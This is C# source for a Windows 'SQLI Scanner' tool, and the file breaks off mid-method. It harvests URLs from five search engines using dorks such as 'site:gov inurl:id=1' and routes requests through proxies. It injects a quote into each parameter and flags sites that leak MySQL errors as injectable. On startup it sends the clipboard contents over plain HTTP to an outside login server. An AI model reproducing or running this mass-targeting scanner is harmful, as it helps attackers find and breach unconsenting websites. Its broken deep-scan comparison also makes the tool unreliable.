using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Web;
using System.Text;
using System.Net;
using HtmlAgilityPack;
using System.Threading;
using System.Threading.Tasks;
using System.Reflection;

namespace SQLIScanner
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        int deb = 1;
        private void Form1_Load(object sender, EventArgs e)
        {
            if (!File.Exists("HtmlAgilityPack.dll"))
            {
                GetDLL("SQLIScanner.HtmlAgilityPack.dll", "HtmlAgilityPack.dll");
            }
            MaximizeBox = false;
            comboBox1.Items.Add("Google");
            comboBox1.Items.Add("Bing");
            comboBox1.Items.Add("Yahoo");
            comboBox1.Items.Add("AOL");
            comboBox1.Items.Add("Ask");
            comboBox2.Items.Add("Simple scan");
            comboBox2.Items.Add("Deep scan");
            comboBox2.Enabled = false;
            button1.Enabled = false;
            button2.Enabled = false;
            button4.Enabled = false;
            button7.Enabled = false;
            button8.Enabled = false;
            button9.Enabled = false;
            button10.Enabled = false;
            button11.Enabled = false;
            numericUpDown1.Enabled = false;
            textBox2.Enabled = false;
            label14.Enabled = false;
            label15.Enabled = false;
            label16.Enabled = false;
            MessageBox.Show(this, "STOP!!! \n Copy the password to your clipboard before closing this pop-up!");
            var result = string.Empty;
            using (var webClient = new System.Net.WebClient())
            {
                result = webClient.DownloadString("http://login.dropdox.net/sqlilogin.php?pass="+Clipboard.GetText().ToString());
            }
            if (result.ToString().ToUpper().Contains("INCORRECT"))
            {
                Application.Exit();
            }
            Form intro = new Form3();
            intro.Show();

        }

        public void GetDLL(string resourceName, string fileName)
        {
            using (var resource = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
            {
                using (var file = new FileStream(fileName, FileMode.Create, FileAccess.Write))
                {
                    resource.CopyTo(file);
                }
            }
        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        //Scanning > Start
        private void button4_Click(object sender, EventArgs e)
        {
            button4.Enabled = false;
            button3.Enabled = false;
            bool bug;
            if(label18.Text == "Enabled")
            {
                bug = true;
            } else
            {
                bug = false;
            }
            string search = textBox2.Text;
            int pages = Decimal.ToInt32(numericUpDown1.Value);
            string proxy = getProxy(checkBox1.Checked);
            if (comboBox1.SelectedItem.ToString() == "Google")
            {
                search_google(pages, search, getProxy(checkBox1.Checked), bug);
            }
            else if (comboBox1.SelectedItem.ToString() == "Bing")
            {
                search_bing(pages, search, getProxy(checkBox1.Checked), bug);
            }
            else if (comboBox1.SelectedItem.ToString() == "Yahoo")
            {
                search_yahoo(pages, search, getProxy(checkBox1.Checked), bug);
            }
            else if (comboBox1.SelectedItem.ToString() == "AOL")
            {
                search_aol(pages, search, getProxy(checkBox1.Checked), bug);
            }
            else if (comboBox1.SelectedItem.ToString() == "Ask")
            {
                search_ask(pages, search, getProxy(checkBox1.Checked), bug);
            }
            //label11.Text = listBox4.Items.Count.ToString();
            button4.Enabled = true;
            button10.Enabled = true;
            comboBox2.Enabled = true;
            label14.Enabled = true;
            label15.Enabled = true;
            label16.Enabled = true;
        }
        //Settings > Import proxies
        private async void button6_Click(object sender, EventArgs e)
        {
            OpenFileDialog theDialog = new OpenFileDialog();
            theDialog.Title = "Import Proxies From File";
            theDialog.Filter = "TXT files|*.txt";
            if (theDialog.ShowDialog() == DialogResult.OK)
            {
                List<string> CheckedProxies = new List<string>();
                int i = 0;
                string filename = theDialog.FileName;
                string[] proxies = File.ReadAllLines(theDialog.FileName);
                foreach (var proxy in proxies)
                {
                    if (proxy.Contains(":"))
                    {
                        if (await Task.Run(() => CanPing(proxy)) == true)
                        {
                            if (!listBox3.Items.Contains(proxy))
                            {
                                listBox3.Items.Add(proxy);
                                CheckedProxies.Add(proxy);
                            }
                        }
                        else
                        {
                            i++;
                        }
                    }
                }
                string bae = listBox3.Items.Count.ToString();
                label10.Text = bae;
                exportProxyToMe();
                MessageBox.Show(this, "Imported " + CheckedProxies.Count + " alive proxies, ignoring " + i + "slow/dead proxies");
            }
        }

        //Results > Save to file 90%+
        private void button1_Click(object sender, EventArgs e)
        {
            if (listBox1.Items.Count != 0)
            {
                SaveFileDialog savefile = new SaveFileDialog();
                savefile.Title = "Export simple scan results";
                savefile.FileName = "results.txt";
                savefile.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
                if (savefile.ShowDialog() == DialogResult.OK)
                {
                    using (StreamWriter sw = new StreamWriter(savefile.FileName))
                    {
                        foreach (var item in listBox1.Items)
                        {
                            sw.WriteLine(item);
                        }
                    }
                    MessageBox.Show(this, "Results successfully exported!");
                }
            }
            else
            {
                MessageBox.Show(this, "There are no results to export!");
            }
        }

        //Results > Save to file (deepscan)
        private void button2_Click(object sender, EventArgs e)
        {
            if(listBox2.Items.Count != 0)
            {
                SaveFileDialog savefile = new SaveFileDialog();
                savefile.Title = "Export deep scan results";
                savefile.FileName = "deepscanresults.txt";
                savefile.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
                if (savefile.ShowDialog() == DialogResult.OK)
                {
                    using (StreamWriter sw = new StreamWriter(savefile.FileName))
                    {
                        foreach (var item in listBox2.Items)
                        {
                            sw.WriteLine(item);
                        }
                    }
                    MessageBox.Show(this, "Deep scan results successfully exported!");
                }
            } else
            {
                MessageBox.Show(this, "There are no results to export!");
            }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if(checkBox1.Checked == true)
            {
                if(label10.Text == "0")
                {
                    MessageBox.Show(this,"You need to import proxies host:port format first!");
                    checkBox1.Checked = false;
                }
            }
        }

        private static async Task<bool> CanPing(string address)
        {
            string[] host = address.Split(':');
            int port = int.Parse(host[1]);
            Ping ping = new Ping();

            try
            {
                PingReply reply = ping.Send(host[0], 1000);
                if (reply == null)
                {
                    return false;
                }
                else
                {
                    if (PingHost(host[0], port) == true)
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
            }
            catch (PingException e)
            {
                string yo = e.ToString();
                return false;
            }
        }
        public static bool PingHost(string _HostURI, int _PortNumber)
        {
            try
            {
                TcpClient client = new TcpClient(_HostURI, _PortNumber);
                return true;
            }
            catch (Exception ex)
            {
                string yo = ex.ToString();
                return false;
            }
        }

        private void SaveFileStream(String path, Stream stream)
        {
            var fileStream = new FileStream(path, FileMode.Create, FileAccess.Write);
            stream.CopyTo(fileStream);
            fileStream.Dispose();
        }
        public async void search_bing(int pages, string search, string proxy, bool bug)
        {
            try
            {
                string urlbase = "http://www.bing.com/search?q=" + HttpUtility.UrlEncode(search).ToString() + "&go=Submit&qs=n&form=QBLH&pq=" + HttpUtility.UrlEncode(search).ToString() + "&first=";
                List<string> listUrl = new List<string>();
                for (int i = 1; i < pages + 1; i++)
                {
                    int a;
                    if (i > 1)
                    {
                        a = i * 10 - 9;
                    }
                    else
                    {
                        a = i;
                    }
                    string url = urlbase + a.ToString();
                    url.Trim();
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                    request.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17";
                    request.AllowWriteStreamBuffering = true;
                    request.Method = "GET";
                    request.Referer = "http://www.bing.com/";
                    request.ProtocolVersion = HttpVersion.Version11;
                    request.AllowAutoRedirect = true;
                    request.Timeout = 30000;
                    request.ContentType = "application/x-www-form-urlencoded";
                    if (proxy != null)
                    {
                        string[] prox;
                        prox = proxy.Split(':');
                        request.Proxy = new WebProxy(prox[0], int.Parse(prox[1]));
                    }
                    var resultStream = await Task.Run(() => getPage(request));
                    if (!resultStream.ToString().Contains("To continue, please type the characters below:"))
                    {
                        if (bug == true)
                        {
                            SaveFileStream(i + "debug" + GetTimestamp(DateTime.Now) + ".html", resultStream);
                        }
                        else
                        {
                            HtmlAgilityPack.HtmlDocument html = new HtmlAgilityPack.HtmlDocument();
                            html.OptionOutputAsXml = true;
                            html.Load(resultStream);
                            HtmlNode doc = html.DocumentNode;
                            foreach (HtmlNode link in doc.SelectNodes("//a[@href]"))
                            {
                                string hrefValue = link.Attributes["href"].Value;
                                if (URLValid(hrefValue) == true)
                                {
                                    if (!listUrl.Contains(urldomain(hrefValue)))
                                    {
                                        listUrl.Add(urldomain(hrefValue));
                                        listBox4.Items.Add(hrefValue);
                                        label11.Text = listBox4.Items.Count.ToString();
                                    }
                                }
                            }
                            MessageBox.Show(this, "Done scanning for URL'S");
                        }
                    }
                    else
                    {
                        MessageBox.Show(this, "Captcha  spotted!");
                        HtmlAgilityPack.HtmlDocument htmlc = new HtmlAgilityPack.HtmlDocument();
                        htmlc.OptionOutputAsXml = true;
                        htmlc.Load(resultStream);
                        HtmlNode docc = htmlc.DocumentNode;
                        foreach (HtmlNode linkc in docc.SelectNodes("//img[@src]"))
                        {
                            string hrefValuec = "http://ipv4.google.com" + linkc.Attributes["src"].Value;
                            Form captha = new Form2(hrefValuec);
                            captha.Show();
                        }
                    }
                }
            }
            catch (System.Net.WebException e)
            {
                MessageBox.Show(this, "Bing thinks youre a bot....: \n " + e.ToString());
            }
        }
        //yahoo results
        public async void search_yahoo(int pages, string search, string proxy, bool bug)
        {
            try
            {
                string urlbase = "https://search.yahoo.com/search;_ylc=X3oDMTFiN25laTRvBF9TAzIwMjM1MzgwNzUEaXRjAzEEc2VjA3NyY2hfcWEEc2xrA3NyY2h3ZWI-?p=" + HttpUtility.UrlEncode(search).ToString() + "&fr=yfp-t&fp=1&toggle=1&cop=mss&ei=UTF-8&pz=10&bct=0&xargs=0&b=";
                List<string> listUrl = new List<string>();
                for (int i = 1; i < pages + 1; i++)
                {
                    int a;
                    if (i > 1)
                    {
                        a = i * 10 - 9;
                    }
                    else
                    {
                        a = i;
                    }
                    string url = urlbase + a.ToString();
                    url.Trim();
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                    request.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17";
                    request.AllowWriteStreamBuffering = true;
                    request.Method = "GET";
                    request.Referer = "https://www.yahoo.com/";
                    request.ProtocolVersion = HttpVersion.Version11;
                    request.AllowAutoRedirect = true;
                    request.Timeout = 30000;
                    request.ContentType = "application/x-www-form-urlencoded";
                    if (proxy != null)
                    {
                        string[] prox;
                        prox = proxy.Split(':');
                        request.Proxy = new WebProxy(prox[0], int.Parse(prox[1]));
                    }
                    var resultStream = await Task.Run(() => getPage(request));
                    if (!resultStream.ToString().Contains("To continue, please type the characters below:"))
                    {
                        if (bug == true)
                        {
                            SaveFileStream(i + "debug" + GetTimestamp(DateTime.Now) + ".html", resultStream);
                        }
                        else
                        {
                            HtmlAgilityPack.HtmlDocument html = new HtmlAgilityPack.HtmlDocument();
                            html.OptionOutputAsXml = true;
                            html.Load(resultStream);
                            HtmlNode doc = html.DocumentNode;
                            foreach (HtmlNode link in doc.SelectNodes("//span"))
                            {
                                string hrefValue = "http://" + link.ChildNodes[0].OuterHtml.Replace("<b>", "").Replace("</b>", "").Trim();//.Replace("\"", "").
                                if (URLValid(hrefValue) == true)
                                {
                                    if (!listUrl.Contains(urldomain(hrefValue)))
                                    {
                                        listUrl.Add(urldomain(hrefValue));
                                        listBox4.Items.Add(hrefValue);
                                        label11.Text = listBox4.Items.Count.ToString();
                                    }
                                }
                            }
                            MessageBox.Show(this, "Done scanning for URL'S");
                        }
                    }
                    else
                    {
                        MessageBox.Show(this, "Captcha  spotted!");
                        HtmlAgilityPack.HtmlDocument htmlc = new HtmlAgilityPack.HtmlDocument();
                        htmlc.OptionOutputAsXml = true;
                        htmlc.Load(resultStream);
                        HtmlNode docc = htmlc.DocumentNode;
                        foreach (HtmlNode linkc in docc.SelectNodes("//img[@src]"))
                        {
                            string hrefValuec = "http://ipv4.google.com" + linkc.Attributes["src"].Value;
                            Form captha = new Form2(hrefValuec);
                            captha.Show();
                        }
                    }
                }
            }
            catch (System.Net.WebException e)
            {
                MessageBox.Show(this, "Yahoo thinks youre a bot....: \n " + e.ToString());
            }
        }
        //asearch aol results
        public async void search_aol(int pages, string search, string proxy, bool bug)
        {
            try
            {
                string urlbase = "http://search.aol.com/aol/search?s_it=sb-top&s_chn=prt_bon&v_t=comsearch&q=" + HttpUtility.UrlEncode(search).ToString() + "&page=";
                List<string> listUrl = new List<string>();
                for (int i = 1; i < pages + 1; i++)
                {
                    int a = i;
                    string url = urlbase + a.ToString();
                    url.Trim();
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                    request.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17";
                    request.AllowWriteStreamBuffering = true;
                    request.Method = "GET";
                    request.Referer = "http://www.aol.com/";
                    request.ProtocolVersion = HttpVersion.Version11;
                    request.AllowAutoRedirect = true;
                    request.Timeout = 30000;
                    request.ContentType = "application/x-www-form-urlencoded";
                    if (proxy != null)
                    {
                        string[] prox;
                        prox = proxy.Split(':');
                        request.Proxy = new WebProxy(prox[0], int.Parse(prox[1]));
                    }
                    var resultStream = await Task.Run(() => getPage(request));
                    if (!resultStream.ToString().Contains("To continue, please type the characters below:"))
                    {
                        if (bug == true)
                        {
                            SaveFileStream(i + "debug" + GetTimestamp(DateTime.Now) + ".html", resultStream);
                        }
                        else
                        {
                            HtmlAgilityPack.HtmlDocument html = new HtmlAgilityPack.HtmlDocument();
                            html.OptionOutputAsXml = true;
                            html.Load(resultStream);
                            HtmlNode doc = html.DocumentNode;
                            foreach (HtmlNode link in doc.SelectNodes("//a[@href]"))
                            {
                                string hrefValue = link.Attributes["href"].Value;
                                if (URLValid(hrefValue) == true)
                                {
                                    if (!listUrl.Contains(urldomain(hrefValue)))
                                    {
                                        listUrl.Add(urldomain(hrefValue));
                                        listBox4.Items.Add(hrefValue);
                                        label11.Text = listBox4.Items.Count.ToString();
                                    }
                                }
                            }
                            MessageBox.Show(this, "Done scanning for URL'S");
                        }
                    }
                    else
                    {
                        MessageBox.Show(this, "Captcha  spotted!");
                        HtmlAgilityPack.HtmlDocument htmlc = new HtmlAgilityPack.HtmlDocument();
                        htmlc.OptionOutputAsXml = true;
                        htmlc.Load(resultStream);
                        HtmlNode docc = htmlc.DocumentNode;
                        foreach (HtmlNode linkc in docc.SelectNodes("//img[@src]"))
                        {
                            string hrefValuec = "http://ipv4.google.com" + linkc.Attributes["src"].Value;
                            Form captha = new Form2(hrefValuec);
                            captha.Show();
                        }
                    }
                }
            }
            catch (System.Net.WebException e)
            {
                MessageBox.Show(this, "AOL thinks youre a bot....: \n " + e.ToString());
            }

        }
        //async visiting page
        public async Task<Stream> getPage(HttpWebRequest request)
        {
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            var resultStream = response.GetResponseStream();
            return resultStream;
        }
        //ask results
        public async void search_ask(int pages, string search, string proxy, bool bug)
        {
            try
            {
                string urlbase = "http://nl.ask.com/web?q=" + HttpUtility.UrlEncode(search).ToString() + "&qsrc=0&o=312&l=dir&qo=homepageSearchBox&page=";
                List<string> listUrl = new List<string>();
                for (int i = 1; i < pages + 1; i++)
                {
                    int a = i;
                    string url = urlbase + a.ToString();
                    url.Trim();
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                    request.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17";
                    request.AllowWriteStreamBuffering = true;
                    request.Method = "GET";
                    request.Referer = "http://nl.ask.com/?o=312&l=dir&ad=dirN";
                    request.ProtocolVersion = HttpVersion.Version11;
                    request.AllowAutoRedirect = true;
                    request.Timeout = 30000;
                    request.ContentType = "application/x-www-form-urlencoded";
                    if (proxy != null)
                    {
                        string[] prox;
                        prox = proxy.Split(':');
                        request.Proxy = new WebProxy(prox[0], int.Parse(prox[1]));
                    }
                    var resultStream = await Task.Run(() => getPage(request));
                    if (!resultStream.ToString().Contains("To continue, please type the characters below:"))
                    {
                        if (bug == true)
                        {
                            SaveFileStream(i + "debug" + GetTimestamp(DateTime.Now) + ".html", resultStream);
                        }
                        else
                        {
                            HtmlAgilityPack.HtmlDocument html = new HtmlAgilityPack.HtmlDocument();
                            html.OptionOutputAsXml = true;
                            html.Load(resultStream);
                            HtmlNode doc = html.DocumentNode;
                            foreach (HtmlNode link in doc.SelectNodes("//a[@href]"))
                            {
                                string hrefValue = link.Attributes["href"].Value;
                                if (URLValid(hrefValue) == true)
                                {
                                    if (!listUrl.Contains(urldomain(hrefValue)))
                                    {
                                        listUrl.Add(urldomain(hrefValue));
                                        listBox4.Items.Add(hrefValue);
                                        label11.Text = listBox4.Items.Count.ToString();
                                    }
                                }
                            }
                            MessageBox.Show(this, "Done scanning for URL'S");
                        }
                    }
                    else
                    {
                        MessageBox.Show(this, "Captcha  spotted!");
                        HtmlAgilityPack.HtmlDocument htmlc = new HtmlAgilityPack.HtmlDocument();
                        htmlc.OptionOutputAsXml = true;
                        htmlc.Load(resultStream);
                        HtmlNode docc = htmlc.DocumentNode;
                        foreach (HtmlNode linkc in docc.SelectNodes("//img[@src]"))
                        {
                            string hrefValuec = "http://ipv4.google.com" + linkc.Attributes["src"].Value;
                            Form captha = new Form2(hrefValuec);
                            captha.Show();
                        }
                    }
                }
            }
            catch (System.Net.WebException e)
            {
                MessageBox.Show(this, "Ask thinks youre a bot....: \n " + e.ToString());
            }
        }
        //google results
        public async void search_google(int pages, string search, string proxy, bool bug)
        {
            try
            {
                string urlbase = "https://www.google.nl/search?sclient=psy-ab&client=aff-maxthon-maxthon4&hs=pT0&affdom=maxthon.com&channel=t39&site=webhp&source=hp&q=" + HttpUtility.UrlEncode(search).ToString() + "&start=";
                List<string> listUrl = new List<string>();
                for (int i = 1; i < pages + 1; i++)
                {
                    int a = i * 10;
                    string url = urlbase + a.ToString();
                    url.Trim();
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                    request.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17";
                    request.AllowWriteStreamBuffering = true;
                    request.Method = "GET";
                    request.Referer = "http://www.google.com/webhp?client=aff-maxthon-maxthon4&channel=t1&gws_rd=cr,ssl";
                    request.ProtocolVersion = HttpVersion.Version11;
                    request.AllowAutoRedirect = true;
                    request.Timeout = 30000;
                    request.ContentType = "application/x-www-form-urlencoded";
                    if (proxy != null)
                    {
                        string[] prox;
                        prox = proxy.Split(':');
                        request.Proxy = new WebProxy(prox[0], int.Parse(prox[1]));
                    }
                    var resultStream = await Task.Run(() => getPage(request));
                    if (!resultStream.ToString().Contains("To continue, please type the characters below:"))
                    {
                        if (bug == true)
                        {
                            SaveFileStream(i + "debug" + GetTimestamp(DateTime.Now) + ".html", resultStream);
                        }
                        else
                        {
                            HtmlAgilityPack.HtmlDocument html = new HtmlAgilityPack.HtmlDocument();
                            html.OptionOutputAsXml = true;
                            html.Load(resultStream);
                            HtmlNode doc = html.DocumentNode;
                            foreach (HtmlNode link in doc.SelectNodes("//a[@href]"))
                            {
                                string hrefValue = link.Attributes["href"].Value;
                                if (URLValid(hrefValue) == true)
                                {
                                    if (!listUrl.Contains(urldomain(hrefValue)))
                                    {
                                        listUrl.Add(urldomain(hrefValue));
                                        listBox4.Items.Add(hrefValue);
                                        label11.Text = listBox4.Items.Count.ToString();
                                    }

                                }
                            }
                            MessageBox.Show(this, "Done scanning for URL'S");
                        }
                    }
                    else
                    {
                        MessageBox.Show(this, "Captcha  spotted!");
                        HtmlAgilityPack.HtmlDocument htmlc = new HtmlAgilityPack.HtmlDocument();
                        htmlc.OptionOutputAsXml = true;
                        htmlc.Load(resultStream);
                        HtmlNode docc = htmlc.DocumentNode;
                        foreach (HtmlNode linkc in docc.SelectNodes("//img[@src]"))
                        {
                            string hrefValuec = "http://ipv4.google.com" + linkc.Attributes["src"].Value;
                            Form captha = new Form2(hrefValuec);
                            captha.Show();
                        }
                    }
                }
            }
            catch (System.Net.WebException e)
            {
                MessageBox.Show(this, "Google thinks youre a bot....: \n " + e.ToString());
            }
            //return listUrl System.Net.WebException ;
        }
        public bool CheckURLValid(string source)
        {
            Uri urihttp;
            Uri urihttps;
            if(Uri.TryCreate(source, UriKind.Absolute, out urihttp) && urihttp.Scheme == Uri.UriSchemeHttp == true)
            {
                return true;
            } else
            {
                if (Uri.TryCreate(source, UriKind.Absolute, out urihttps) && urihttps.Scheme == Uri.UriSchemeHttps == true)
                {
                    return true;
                } else
                {
                    return false;
                }
            }
        }
        public bool URLValid(string url)
        {
            if(CheckURLValid(url) != true)
            {
                return false;
            } else
            {
                if(!url.ToUpper().Contains("CCS.INFOSPACE.COM") && !url.ToUpper().Contains("ASK.COM") && !url.ToUpper().Contains("MSN") && !url.ToUpper().Contains("AOL") && !url.ToUpper().Contains("YAHOO") && !url.ToUpper().Contains("MICROSOFT.COM") && !url.ToUpper().Contains("MICROSOFTTRANSLATOR") && !url.ToUpper().Contains("BING") && !url.ToUpper().Contains("GOOGLE") && !url.ToUpper().Contains("URL=") && !url.ToUpper().Contains("SEARCH?Q=") && !url.ToUpper().Contains("SEARCH?CLIENT=") && !url.ToUpper().Contains("YOUTUBE.COM") && !url.ToUpper().Contains("BLOGGER.COM"))
                {
                    return true;
                } else
                {
                    return false;
                }
            }
        }
        //add singular proxy
        private async void button7_Click(object sender, EventArgs e)
        {
            if (textBox1.Text.Contains(':'))
            {
                if (await Task.Run(() => CanPing(textBox1.Text)) == true)
                {
                    if (!listBox3.Items.Contains(textBox1.Text))
                    {
                        listBox3.Items.Add(textBox1.Text);
                        string bae = listBox3.Items.Count.ToString();
                        label10.Text = bae;
                        exportProxyToMe();
                        MessageBox.Show(this, "Imported proxy successfully!");
                    }
                    else
                    {
                        MessageBox.Show(this, "Cant import duplicate!");
                    }
                }
                else
                {
                    MessageBox.Show(this, "This proxy is slow (timeout is over 1.2 seconds) or is dead");
                }
            }
            else
            {
                MessageBox.Show(this, "Enter proxy in host:port format!");
            }
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            if (comboBox1.SelectedIndex > -1 && textBox2.Text.Length != 0)
            {
                button4.Enabled = true;
                numericUpDown1.Enabled = true;
            } else
            {
                button4.Enabled = false;
                numericUpDown1.Enabled = false;
            }
        }
        //deep scan
        public async Task<bool> scan_deep(string url, string proxy)
        {
            if (url.Contains("="))
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17";
                request.AllowWriteStreamBuffering = true;
                request.Method = "GET";
                request.Referer = "http://www.google.com/webhp?client=aff-maxthon-maxthon4&channel=t1&gws_rd=cr,ssl";
                request.ProtocolVersion = HttpVersion.Version11;
                request.AllowAutoRedirect = true;
                request.Timeout = 30000;
                request.ContentType = "application/x-www-form-urlencoded";
                if (proxy != null)
                {
                    string[] prox;
                    prox = proxy.Split(':');
                    request.Proxy = new WebProxy(prox[0], int.Parse(prox[1]));
                }
                url = url.Replace("=", "=%27").Trim();
                HttpWebRequest request2 = (HttpWebRequest)WebRequest.Create(url);
                request2.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17";
                request2.AllowWriteStreamBuffering = true;
                request2.Method = "GET";
                request2.Referer = "http://www.google.com/webhp?client=aff-maxthon-maxthon4&channel=t1&gws_rd=cr,ssl";
                request2.ProtocolVersion = HttpVersion.Version11;
                request2.AllowAutoRedirect = true;
                request2.Timeout = 30000;
                request2.ContentType = "application/x-www-form-urlencoded";
                if (proxy != null)
                {
                    string[] prox;
                    prox = proxy.Split(':');
                    request.Proxy = new WebProxy(prox[0], int.Parse(prox[1]));
                }
                try
                {
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    var resultStream = response.GetResponseStream();
                    HttpWebResponse response2 = (HttpWebResponse)request2.GetResponse();
                    var resultStream2 = response2.GetResponseStream();
                    if (resultStream != resultStream2)
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                } catch (Exception e)
                {
                    //MessageBox.Show(this, e.ToString());
                    return false;
                }
            } else
            {
                return false;
            }
        }
        //simple scan
        public async Task<bool> scan_simple(string url, string proxy)
        {
            if (url.Contains("="))
            {
                url = url.Replace("=", "=%27").Trim();
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17";
                request.AllowWriteStreamBuffering = true;
                request.Method = "GET";
                request.Referer = "http://www.google.com/webhp?client=aff-maxthon-maxthon4&channel=t1&gws_rd=cr,ssl";
                request.ProtocolVersion = HttpVersion.Version11;
                request.AllowAutoRedirect = true;
                request.Timeout = 30000;
                request.ContentType = "application/x-www-form-urlencoded";
                if (proxy != null)
                {
                    string[] prox;
                    prox = proxy.Split(':');
                    request.Proxy = new WebProxy(prox[0], int.Parse(prox[1]));
                }
                try
                {
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    var resultStream = response.GetResponseStream();
                    HtmlAgilityPack.HtmlDocument html = new HtmlAgilityPack.HtmlDocument();
                    html.OptionOutputAsXml = true;
                    html.Load(resultStream);
                    HtmlNode docc = html.DocumentNode;
                    
                    if (docc.OuterHtml.ToUpper().Contains("YOU HAVE AN ERROR IN YOUR SQL SYNTAX"))
                    {
                        return true;
                    }
                    else if (docc.OuterHtml.ToUpper().Contains("CHECK THE MANUAL THAT CORRESPONDS TO YOUR MYSQL SERVER VERSION FOR THE RIGHT SYNTAX TO USE NEAR"))
                    {
                        return true;
                    }
                    else if (docc.OuterHtml.ToUpper().Contains("QUERY") && docc.OuterHtml.ToUpper().Contains("FAILED"))
                    {
                        return true;
                    }
                    else if (docc.OuterHtml.ToUpper().Contains("MYSQL") && docc.OuterHtml.ToUpper().Contains("1064"))
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                } catch (Exception e)
                {
                    //MessageBox.Show(this, e.ToString());
                    return false;
                }
            } else
            {
                return false;
            }
        }
        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            textBox2.Enabled = true;
            if(comboBox1.SelectedItem.ToString() == "AOL")
            {
                MessageBox.Show(this, " inurl: dork is blocked \n example : site:gov inurl:id=1 gives 0 results \n but site:gov id=1 works fine!");
            }
        }
        
        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (listBox1.SelectedIndex != -1)
            {
                Clipboard.SetText(listBox1.SelectedItem.ToString());
                MessageBox.Show(this, "Copied url to clipboard!");
            }
            else
            {
                MessageBox.Show(this, "Nothing to copy!");
            }
        }

        private void label5_Click(object sender, EventArgs e)
        {

        }
        //export both listboxes
        private void button8_Click(object sender, EventArgs e)
        {
            SaveFileDialog savefile = new SaveFileDialog();
            savefile.FileName = "results.txt";
            savefile.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
            if (savefile.ShowDialog() == DialogResult.OK)
            {
                using (StreamWriter sw = new StreamWriter(savefile.FileName))
                {
                    if (listBox1.Items.Count != 0)
                    {
                        sw.WriteLine(" ");
                        sw.WriteLine("//SIMPLE SCAN RESULTS//");
                        sw.WriteLine(" ");
                        foreach (var item in listBox1.Items)
                        {
                            sw.WriteLine(item);
                        }
                    }
                    if (listBox2.Items.Count != 0)
                    {
                        sw.WriteLine(" ");
                        sw.WriteLine("//DEEP SCAN RESULTS//");
                        sw.WriteLine(" ");
                        foreach (var item in listBox2.Items)
                        {
                            sw.WriteLine(item);
                        }
                    }
                    sw.WriteLine(" ");
                    sw.WriteLine(" ");
                    sw.WriteLine("//FAW SQLI SCANNER EXPORTED " + (listBox1.Items.Count + listBox2.Items.Count).ToString() + " RESULTS//");

                }
                MessageBox.Show(this, "Results successfully exported!");
            }
            
        }
        //Reset both listboxes
        private void button9_Click(object sender, EventArgs e)
        {
            listBox1.Items.Clear();
            listBox2.Items.Clear();
            button1.Enabled = false;
            button2.Enabled = false;
            button8.Enabled = false;
            button9.Enabled = false;
            label13.Text = "0";
            label12.Text = "0";
        }
        //save all URL'S
        private void button10_Click(object sender, EventArgs e)
        {
            if (listBox4.Items.Count != 0)
            {
                SaveFileDialog savefile = new SaveFileDialog();
                savefile.FileName = "urls.txt";
                savefile.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
                if (savefile.ShowDialog() == DialogResult.OK)
                {
                    using (StreamWriter sw = new StreamWriter(savefile.FileName))
                    {
                        foreach (var item in listBox4.Items)
                        {
                            sw.WriteLine(item);
                        }
                    }
                    MessageBox.Show(this, "Results successfully exported!");
                }
            }
            else
            {
                MessageBox.Show(this, "There are no urls to export!");
            }
        }
        //get uri domain
        public string urldomain(string url)
        {
            string result = null;
            var uri = new Uri(url);
            var baseuri = uri.GetLeftPart(UriPartial.Authority);
            result = baseuri.ToString();
            return result;
        }
        //scan the URL's
        private async void button11_Click(object sender, EventArgs e)
        {
            button8.Enabled = true;
            button9.Enabled = true;
            string mode = comboBox2.SelectedItem.ToString();
            if (mode == "Simple scan")
            {
                button1.Enabled = true;
                for (int i = 0; i < listBox4.Items.Count; i++)
                {

                    if (await Task.Run(() => scan_simple(listBox4.Items[i].ToString(), getProxy(checkBox1.Checked))) == true)
                    {
                        listBox1.Items.Add(listBox4.Items[i].ToString());
